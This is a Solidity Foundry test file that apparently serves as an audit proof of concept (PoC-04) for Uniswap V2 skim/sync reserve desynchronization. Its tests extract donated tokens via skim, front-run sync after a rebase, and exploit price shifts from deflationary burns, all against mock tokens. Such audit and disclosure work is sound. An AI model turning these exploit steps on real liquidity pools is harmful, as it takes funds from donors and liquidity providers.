// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/interfaces/IUniswapV2.sol";

/**
 * PoC-04: Skim/Sync Reserve Desynchronization Exploits
 *
 * Finding: skim() and sync() create attack vectors with non-standard tokens:
 *
 * 1. skim() extracts balance - reserve difference. Anyone who sends tokens
 *    directly to a pair (donation, airdrop, mistake) loses them to the first
 *    skim() caller. This is MEV-extractable.
 *
 * 2. sync() sets reserves = balances. Combined with rebasing tokens, this
 *    enables front-running: swap at stale price, then sync to update reserves.
 *
 * 3. Deflationary tokens that reduce pair balance externally create a reserve >
 *    balance state. sync() fixes this but the price shift is exploitable.
 *
 * Root cause: UniswapV2Pair.sol:189-200 (skim/sync)
 * The pair caches reserves separately from actual balances. Any external
 * mechanism that changes the balance without going through pair functions
 * creates an exploitable desync.
 *
 * Severity: HIGH (for rebasing/deflationary tokens)
 * Category: State desynchronization / Token compatibility
 */
contract PoC04_SkimSyncExploit is Test {
    IUniswapV2Factory factory;

    function setUp() public {
        factory = IUniswapV2Factory(
            deployCode("v2-core/UniswapV2Factory.sol:UniswapV2Factory", abi.encode(address(this)))
        );
    }

    /**
     * Demonstrates skim() extracting donated tokens from a pair.
     */
    function test_skimExtraction() public {
        MockERC20 tokenA = new MockERC20("TokenA", "TKA");
        MockERC20 tokenB = new MockERC20("TokenB", "TKB");

        address pair = factory.createPair(address(tokenA), address(tokenB));
        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);

        // Initial liquidity
        uint256 initAmount = 100 ether;
        tokenA.mint(address(this), initAmount);
        tokenB.mint(address(this), initAmount);
        tokenA.transfer(pair, initAmount);
        tokenB.transfer(pair, initAmount);
        uniPair.mint(address(this));

        (uint112 r0,,) = uniPair.getReserves();

        // Someone donates tokens to the pair
        address donor = makeAddr("donor");
        uint256 donationAmount = 10 ether;
        tokenA.mint(donor, donationAmount);

        vm.prank(donor);
        tokenA.transfer(pair, donationAmount);

        uint256 balance0 = tokenA.balanceOf(pair);
        emit log_named_uint("Token0 balance (after donation)", balance0);
        emit log_named_uint("Token0 reserve (unchanged)", r0);
        emit log_named_uint("Excess extractable via skim", balance0 - uint256(r0));

        // Attacker calls skim to extract the excess
        address attacker = makeAddr("attacker");

        vm.prank(attacker);
        uniPair.skim(attacker);

        uint256 extracted = tokenA.balanceOf(attacker);
        emit log_named_uint("Attacker extracted via skim", extracted);
        assertEq(extracted, donationAmount, "Attacker extracts full donation");

        // Reserves unchanged
        (uint112 r0_after,,) = uniPair.getReserves();
        assertEq(r0_after, r0, "Reserves unchanged after skim");
        emit log("CONFIRMED: skim() allows anyone to extract donated/airdropped tokens");
    }

    /**
     * Demonstrates sync() price manipulation with a rebasing token.
     */
    function test_syncRebaseExploit() public {
        RebasingToken rebaseToken = new RebasingToken("Rebase", "RBT");
        MockERC20 stableToken = new MockERC20("Stable", "STB");

        address pair = factory.createPair(address(rebaseToken), address(stableToken));
        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);

        address token0 = uniPair.token0();

        // Initial liquidity: 1000 each (1:1 price)
        uint256 initAmount = 1000 ether;
        rebaseToken.mint(pair, initAmount);
        stableToken.mint(address(this), initAmount);
        stableToken.transfer(pair, initAmount);
        uniPair.mint(address(this));

        (uint112 r0_before, uint112 r1_before,) = uniPair.getReserves();
        emit log_named_uint("Reserve0 before rebase", r0_before);
        emit log_named_uint("Reserve1 before rebase", r1_before);

        // --- Rebase: all balances increase by 10% ---
        rebaseToken.rebase(110); // 110%

        uint256 rebaseBalance = rebaseToken.balanceOf(pair);
        emit log_named_uint("Rebase token balance after rebase", rebaseBalance);

        // Attacker front-runs sync() by swapping at the OLD price
        address attacker = makeAddr("attacker");
        uint256 swapAmount = 100 ether;
        stableToken.mint(attacker, swapAmount);

        vm.startPrank(attacker);
        stableToken.transfer(pair, swapAmount);

        (uint112 cr0, uint112 cr1,) = uniPair.getReserves();

        uint256 amountOut;
        if (token0 == address(rebaseToken)) {
            amountOut = getAmountOut(swapAmount, uint256(cr1), uint256(cr0));
            uniPair.swap(amountOut, 0, attacker, "");
        } else {
            amountOut = getAmountOut(swapAmount, uint256(cr0), uint256(cr1));
            uniPair.swap(0, amountOut, attacker, "");
        }
        vm.stopPrank();

        emit log_named_uint("Attacker received rebase tokens (at stale price)", amountOut);

        // Now sync to update reserves
        uniPair.sync();

        (uint112 r0_after, uint112 r1_after,) = uniPair.getReserves();
        emit log_named_uint("Reserve0 after sync", r0_after);
        emit log_named_uint("Reserve1 after sync", r1_after);

        emit log("KEY: Attacker swapped at stale price before sync, extracting rebase value from LPs");
    }

    /**
     * Demonstrates sync() after deflationary token burn creates exploitable price shift.
     */
    function test_syncDeflationaryExploit() public {
        DeflatingToken deflToken = new DeflatingToken("Deflating", "DFL");
        MockERC20 normalToken = new MockERC20("Normal", "NRM");

        address pair = factory.createPair(address(deflToken), address(normalToken));
        IUniswapV2Pair uniPair = IUniswapV2Pair(pair);

        address token0 = uniPair.token0();

        // Initial liquidity
        uint256 initAmount = 1000 ether;
        deflToken.mint(pair, initAmount);
        normalToken.mint(address(this), initAmount);
        normalToken.transfer(pair, initAmount);
        uniPair.mint(address(this));

        (uint112 r0_before, uint112 r1_before,) = uniPair.getReserves();

        // External deflation: 20% of pair's balance is burned
        uint256 burnAmount = deflToken.balanceOf(pair) * 20 / 100;
        deflToken.burnFrom(pair, burnAmount);

        uint256 newBalance = deflToken.balanceOf(pair);

        if (token0 == address(deflToken)) {
            emit log_named_uint("Reserve0 (stale, deflToken)", r0_before);
        } else {
            emit log_named_uint("Reserve1 (stale, deflToken)", r1_before);
        }
        emit log_named_uint("Actual deflToken balance after burn", newBalance);

        // Sync to update reserves
        uniPair.sync();

        (uint112 r0_after, uint112 r1_after,) = uniPair.getReserves();
        emit log_named_uint("Reserve0 after sync", r0_after);
        emit log_named_uint("Reserve1 after sync", r1_after);

        // Price has shifted: deflating token is now scarcer
        if (token0 == address(deflToken)) {
            uint256 priceBefore = uint256(r1_before) * 1e18 / uint256(r0_before);
            uint256 priceAfter = uint256(r1_after) * 1e18 / uint256(r0_after);
            emit log_named_uint("Price (normalToken/deflToken) before", priceBefore);
            emit log_named_uint("Price (normalToken/deflToken) after", priceAfter);
            assertTrue(priceAfter > priceBefore, "DeflToken should be more expensive after burn");
        } else {
            uint256 priceBefore = uint256(r0_before) * 1e18 / uint256(r1_before);
            uint256 priceAfter = uint256(r0_after) * 1e18 / uint256(r1_after);
            emit log_named_uint("Price (normalToken/deflToken) before", priceBefore);
            emit log_named_uint("Price (normalToken/deflToken) after", priceAfter);
            assertTrue(priceAfter > priceBefore, "DeflToken should be more expensive after burn");
        }

        emit log("CONFIRMED: sync() after external deflation shifts price, enabling front-running");
    }

    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal pure returns (uint256)
    {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        return numerator / denominator;
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract RebasingToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    uint256 private _multiplier = 100;
    mapping(address => uint256) private _rawBalances;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _rawBalances[account] * _multiplier / 100;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        _rawBalances[to] += amount;
    }

    function rebase(uint256 newMultiplier) external {
        totalSupply = totalSupply * newMultiplier / _multiplier;
        _multiplier = newMultiplier;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 rawAmount = amount * 100 / _multiplier;
        _rawBalances[msg.sender] -= rawAmount;
        _rawBalances[to] += rawAmount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        uint256 rawAmount = amount * 100 / _multiplier;
        _rawBalances[from] -= rawAmount;
        _rawBalances[to] += rawAmount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract DeflatingToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function burnFrom(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}
